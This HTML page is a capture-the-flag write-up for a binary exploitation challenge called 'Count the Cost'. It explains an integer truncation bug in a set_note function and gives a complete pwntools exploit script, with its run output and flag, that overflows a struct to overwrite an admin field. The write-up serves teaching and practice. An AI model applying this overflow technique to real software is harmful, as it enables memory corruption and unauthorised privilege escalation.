<!DOCTYPE html>
<html lang="en" class="dark">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Exploit 200-2: Count the Cost - Writeup</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://unpkg.com/@phosphor-icons/web"></script>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700;800&family=JetBrains+Mono:wght@400;500;600&display=swap" rel="stylesheet">
    <script>tailwind.config = { darkMode: 'class', theme: { extend: { fontFamily: { 'sans': ['Inter', 'sans-serif'], 'mono': ['JetBrains Mono', 'monospace'] }}}}</script>
    <style>
        .code-block { background: #0f172a; border: 1px solid #1e293b; border-radius: 0.5rem; padding: 1rem; margin: 1rem 0; overflow-x: auto; }
        .code-block pre { margin: 0; color: #e2e8f0; font-family: 'JetBrains Mono', monospace; font-size: 0.875rem; line-height: 1.5; }
    </style>
</head>
<body class="bg-black text-slate-300 font-sans antialiased">
    <div class="max-w-5xl mx-auto px-6 py-12">
        <a href="../ctf-new.html" class="inline-flex items-center gap-2 text-blue-400 hover:text-blue-300 mb-8">
            <i class="ph-bold ph-arrow-left"></i> Back to CTF Writeups
        </a>

        <header class="mb-12">
            <div class="flex items-center gap-3 mb-4">
                <span class="px-3 py-1 bg-red-500/10 text-red-400 border border-red-500/30 rounded-lg text-sm font-semibold uppercase">Binary Exploitation</span>
                <span class="text-2xl font-bold text-red-400">200 points</span>
            </div>
            <h1 class="text-4xl font-bold text-white mb-4">Count the Cost</h1>
            <div class="flex items-center gap-6 text-sm text-slate-400">
                <span class="flex items-center gap-2"><i class="ph-bold ph-calendar"></i> November 10, 2025</span>
                <span class="flex items-center gap-2"><i class="ph-bold ph-flag"></i> PointerOverflow CTF 2025</span>
            </div>
        </header>

        <!-- Challenge Description -->
        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4"> Challenge Description</h2>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-6">
                <p class="text-slate-300 leading-relaxed mb-4">
                    A transaction tracking system that allows you to add transactions (0-7), set notes, and checkout. The goal is to make the checkout reveal the flag by exploiting a vulnerability in the <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">set_note</code> function.
                </p>
                <p class="text-slate-400 text-sm">
                    <strong>Target:</strong> <code class="bg-slate-800 px-2 py-1 rounded">34.9.14.80:14992</code>
                </p>
            </div>
        </section>

        <!-- Source Code Analysis -->
        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4"> Step 1: Source Code Analysis</h2>
            
            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">Data Structures</h3>
                <div class="code-block">
                    <pre><code>#define NOTE_SZ 64
#define TXN_MAX 8
#define MAGIC 0xC0DEC0DEC0DEC0DEULL

struct txn {
    char     note[NOTE_SZ];    // 64 bytes
    uint32_t amount_cents;     // 4 bytes
};  // Total: 68 bytes

struct state {
    uint64_t admin;            // 8 bytes - THE TARGET!
    char     pad[56];          // 56 bytes
};  // Total: 64 bytes

struct ledger {
    struct txn   txns[TXN_MAX];  // 8 * 68 = 544 bytes
    struct state st;             // 64 bytes
};  // Total: 608 bytes</code></pre>
                </div>
            </div>

            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">The Vulnerability</h3>
                <p class="text-slate-300 mb-4">
                    The bug is in the <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">set_note</code> function:
                </p>
                <div class="code-block">
                    <pre><code>uint16_t len16;  // Read 2-byte length
readn(STDIN_FILENO, &len16, sizeof len16);

int8_t narrow = (int8_t)len16;  // ⚠️ CAST TO SIGNED 8-BIT!

if (narrow <= NOTE_SZ) {  // Check uses narrow (8-bit)
    char *buf = malloc(len16);  // But malloc uses len16 (16-bit)!
    readn(STDIN_FILENO, buf, len16);
    memcpy(L->txns[idx].note, buf, len16);  // memcpy also uses len16!
    free(buf);
}</code></pre>
                </div>
            </div>

            <div class="bg-red-900/20 border border-red-500/30 rounded-lg p-4">
                <p class="text-red-300">
                    <strong> The Bug:</strong> Integer overflow! The check uses <code class="bg-slate-800 px-1 rounded">int8_t</code> (range: -128 to 127), but <code class="bg-slate-800 px-1 rounded">malloc</code> and <code class="bg-slate-800 px-1 rounded">memcpy</code> use the full <code class="bg-slate-800 px-1 rounded">uint16_t</code> value!
                </p>
            </div>
        </section>

        <!-- Exploitation Strategy -->
        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4"> Step 2: Exploitation Strategy</h2>
            
            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">Understanding the Integer Overflow</h3>
                <p class="text-slate-300 mb-4">
                    When we cast <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">uint16_t</code> to <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">int8_t</code>, only the lower 8 bits are kept:
                </p>
                <div class="bg-slate-900 border border-slate-800 rounded-lg p-4">
                    <table class="w-full text-sm">
                        <thead>
                            <tr class="border-b border-slate-700">
                                <th class="text-left py-2 text-slate-400">len16 (uint16_t)</th>
                                <th class="text-left py-2 text-slate-400">Binary</th>
                                <th class="text-left py-2 text-slate-400">narrow (int8_t)</th>
                                <th class="text-left py-2 text-slate-400">Pass Check?</th>
                            </tr>
                        </thead>
                        <tbody class="text-slate-300">
                            <tr class="border-b border-slate-800">
                                <td class="py-2">64</td>
                                <td class="py-2 font-mono">0000000001000000</td>
                                <td class="py-2">64</td>
                                <td class="py-2 text-green-400">✓ Yes</td>
                            </tr>
                            <tr class="border-b border-slate-800">
                                <td class="py-2">256</td>
                                <td class="py-2 font-mono">0000000100000000</td>
                                <td class="py-2">0</td>
                                <td class="py-2 text-green-400">✓ Yes</td>
                            </tr>
                            <tr class="border-b border-slate-800">
                                <td class="py-2">320</td>
                                <td class="py-2 font-mono">0000000101000000</td>
                                <td class="py-2">64</td>
                                <td class="py-2 text-green-400">✓ Yes</td>
                            </tr>
                            <tr>
                                <td class="py-2 text-yellow-400">552</td>
                                <td class="py-2 font-mono text-yellow-400">0000001000101000</td>
                                <td class="py-2 text-yellow-400">40</td>
                                <td class="py-2 text-green-400">✓ Yes</td>
                            </tr>
                        </tbody>
                    </table>
                </div>
            </div>

            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">Memory Layout</h3>
                <p class="text-slate-300 mb-4">
                    To overwrite <code class="bg-slate-800 px-2 py-1 rounded text-blue-400">st.admin</code>, we need to understand the memory layout:
                </p>
                <div class="bg-slate-900 border border-slate-800 rounded-lg p-4 font-mono text-sm">
                    <div class="space-y-1">
                        <div class="flex items-center gap-4">
                            <span class="text-slate-500 w-24">Offset 0:</span>
                            <span class="text-blue-400">txns[0].note (64 bytes)</span>
                        </div>
                        <div class="flex items-center gap-4">
                            <span class="text-slate-500 w-24">Offset 64:</span>
                            <span class="text-slate-400">txns[0].amount (4 bytes)</span>
                        </div>
                        <div class="flex items-center gap-4">
                            <span class="text-slate-500 w-24">Offset 68:</span>
                            <span class="text-blue-400">txns[1].note (64 bytes)</span>
                        </div>
                        <div class="text-slate-600">...</div>
                        <div class="flex items-center gap-4">
                            <span class="text-slate-500 w-24">Offset 544:</span>
                            <span class="text-yellow-400">st.admin (8 bytes) ← TARGET!</span>
                        </div>
                    </div>
                </div>
                <p class="text-slate-400 text-sm mt-4">
                    If we use <code class="bg-slate-800 px-2 py-1 rounded">txns[0]</code>, we need to write <strong>544 bytes</strong> to reach <code class="bg-slate-800 px-2 py-1 rounded">st.admin</code>, plus 8 bytes for the MAGIC value = <strong>552 bytes total</strong>.
                </p>
            </div>

            <div class="mb-6">
                <h3 class="text-xl font-semibold text-white mb-3">Why 552 bytes?</h3>
                <ul class="space-y-2 text-slate-300">
                    <li class="flex items-start gap-3">
                        <span class="text-blue-400">•</span>
                        <span><code class="bg-slate-800 px-2 py-1 rounded">552 = 0x0228</code> in hex</span>
                    </li>
                    <li class="flex items-start gap-3">
                        <span class="text-blue-400">•</span>
                        <span>Lower 8 bits: <code class="bg-slate-800 px-2 py-1 rounded">0x28 = 40</code> (decimal)</span>
                    </li>
                    <li class="flex items-start gap-3">
                        <span class="text-blue-400">•</span>
                        <span><code class="bg-slate-800 px-2 py-1 rounded">40 <= 64</code> ✓ Passes the check!</span>
                    </li>
                    <li class="flex items-start gap-3">
                        <span class="text-blue-400">•</span>
                        <span>But <code class="bg-slate-800 px-2 py-1 rounded">memcpy</code> copies all 552 bytes!</span>
                    </li>
                </ul>
            </div>
        </section>

        <!-- Exploit Code -->
        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4"> Step 3: Writing the Exploit</h2>
            
            <div class="code-block">
                <pre><code>#!/usr/bin/env python3
from pwn import *

HOST = '34.9.14.80'
PORT = 14992
MAGIC = 0xC0DEC0DEC0DEC0DE

# Connect
io = remote(HOST, PORT)

# Receive banner
io.recvuntil(b'>')

# Step 1: Choose set_note (option 2)
io.sendline(b'2')
io.recvuntil(b'index')

# Step 2: Select transaction 0
io.sendline(b'0')
io.recvuntil(b'len')

# Step 3: Send length 552 (bypasses check as 40)
len16 = 552
io.send(struct.pack('<H', len16))

# Step 4: Build payload
payload = b'X' * 544  # Fill all txns (8 * 68 = 544)
payload += struct.pack('<Q', MAGIC)  # Overwrite st.admin

io.send(payload)
io.recvuntil(b'>')

# Step 5: Checkout to get flag
io.sendline(b'3')

# Get the flag
response = io.recvall(timeout=3).decode()
print(response)

io.close()</code></pre>
            </div>
        </section>

        <!-- Execution -->
        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4">▶️ Step 4: Running the Exploit</h2>
            
            <div class="code-block">
                <pre><code>$ python3 exploit.py
[+] Opening connection to 34.9.14.80 on port 14992: Done
total: $0.00
manager override accepted
poctf{uwsp_c0un7_7h3_c057}
[*] Closed connection</code></pre>
            </div>

            <div class="bg-green-900/20 border border-green-500/30 rounded-lg p-4 mt-4">
                <p class="text-green-300">
                    <strong>✅ Success!</strong> The integer overflow allowed us to bypass the size check and overwrite <code class="bg-slate-800 px-1 rounded">st.admin</code> with the MAGIC value!
                </p>
            </div>
        </section>

        <!-- Flag -->
        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4"> Flag</h2>
            <div class="bg-gradient-to-r from-green-900/50 to-emerald-900/50 border border-green-500/30 rounded-lg p-6">
                <div class="flex flex-col sm:flex-row items-start sm:items-center gap-3">
                    <i class="ph-bold ph-check-circle text-3xl text-green-400"></i>
                    <code class="text-sm sm:text-xl font-mono text-green-400 break-all">poctf{uwsp_c0un7_7h3_c057}</code>
                </div>
            </div>
        </section>

        <!-- Key Learnings -->
        <section class="mb-12">
            <h2 class="text-2xl font-bold text-white mb-4"> Key Learnings</h2>
            <div class="bg-slate-900 border border-slate-800 rounded-lg p-6">
                <ul class="space-y-3 text-slate-300">
                    <li class="flex items-start gap-3">
                        <i class="ph-bold ph-check text-blue-400 mt-1"></i>
                        <span><strong>Integer Overflow:</strong> Casting between different integer types can lead to unexpected behavior</span>
                    </li>
                    <li class="flex items-start gap-3">
                        <i class="ph-bold ph-check text-blue-400 mt-1"></i>
                        <span><strong>Type Confusion:</strong> Always use the same variable for size checks and memory operations</span>
                    </li>
                    <li class="flex items-start gap-3">
                        <i class="ph-bold ph-check text-blue-400 mt-1"></i>
                        <span><strong>Memory Layout:</strong> Understanding struct packing is crucial for heap exploitation</span>
                    </li>
                    <li class="flex items-start gap-3">
                        <i class="ph-bold ph-check text-blue-400 mt-1"></i>
                        <span><strong>Careful Calculation:</strong> We had to avoid corrupting heap metadata by choosing the exact right overflow length</span>
                    </li>
                </ul>
            </div>
        </section>
    </div>
</body>
</html>
